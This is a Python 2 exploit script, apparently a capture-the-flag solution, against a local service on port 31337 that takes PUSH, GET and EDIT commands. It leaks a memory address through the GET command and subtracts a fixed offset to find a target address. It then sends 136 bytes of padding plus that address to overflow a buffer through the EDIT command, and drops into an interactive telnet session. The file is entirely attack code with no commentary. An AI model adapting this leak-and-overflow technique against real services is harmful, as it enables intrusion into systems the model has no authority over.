import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib



LOCAL = ('localhost',31337)
BUFFER = 4096



s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=1):
	recv_ = ''
	while not str in recv_:
		tmp = s.recv(BUFFER)
		recv_ += tmp
		if debug:
			print tmp
		continue
	return recv_

def push(name,value):
	recv_until('cmd>')
	s.send("PUSH\n")
	s.send("{}\n".format(name))
	s.send("{}\n".format(value))
	
push("AAAA","B")

recv_until('cmd>')
s.send("GET\n")
s.send("AAAA\n")
data = unpack('<Q',s.recv(6)+"\x00\x00")[0]
magic = data - 0x1b4bad9

print hex(magic)


recv_until('cmd>')
s.send("EDIT\n")

print s.recv(BUFFER)
s.send("0\n")
s.send("ABC\"\n")
print s.recv(BUFFER)
print s.recv(BUFFER)
raw_input("?")
payload = 'A'*136 + pack('<Q',magic)
s.send(payload+'\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()